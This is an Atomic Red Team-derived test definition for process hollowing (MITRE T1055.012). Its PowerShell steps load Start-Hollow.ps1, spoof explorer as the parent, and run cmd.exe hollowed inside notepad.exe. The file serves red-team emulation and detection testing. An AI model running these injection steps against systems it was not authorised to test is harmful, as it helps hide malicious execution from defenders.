# Converted from Atomic Red Team - Process Injection: Process Hollowing
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1055.012
# Original auto_generated_guid: 562427b4-39ef-4e8c-af88-463a78e70b9c

---
api_version: 2.0
uuid: 6e010a81-12ba-4a5b-9ef4-2d51837a89f9
name: Process Hollowing using PowerShell
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
  Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)

mitre:
  tactics:
    - "TA0004 Privilege Escalation"
    - "TA0005 Defense Evasion"
  techniques:
    - "T1055 Process Injection"
  subtechniques:
    - "T1055.012 Process Hollowing"

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: script_path
    description: Path to Start-Hollow.ps1 script
    type: path
    default: "./Start-Hollow.ps1"
  - name: hollow_binary_path
    description: Path of the binary to hollow (executable that will run inside the sponsor)
    type: path
    default: "C:\\Windows\\System32\\cmd.exe"
  - name: parent_process_name
    description: Name of the parent process
    type: string
    default: "explorer"
  - name: sponsor_binary_path
    description: Path of the sponsor binary (executable that will host the binary)
    type: path
    default: "C:\\Windows\\System32\\notepad.exe"
  - name: spawnto_process_name
    description: Name of the process to spawn
    type: string
    default: "notepad"

steps:
  - name: ensure_script_exists
    executor: powershell
    inline: |
      if (-not (Test-Path "{{.Args.script_path}}")) {
        Write-Error "Start-Hollow.ps1 not found at {{.Args.script_path}}. Exiting..."
        exit 1
      }

  - name: execute_process_hollowing
    executor: powershell
    inline: |
      . "{{.Args.script_path}}"
      $ppid=Get-Process {{.Args.parent_process_name}} | select -expand id
      Start-Hollow -Sponsor "{{.Args.sponsor_binary_path}}" -Hollow "{{.Args.hollow_binary_path}}" -ParentPID $ppid -Verbose
    cleanup:
      executor: powershell
      inline: |
        Stop-Process -Name "{{.Args.spawnto_process_name}}" -ErrorAction Ignore
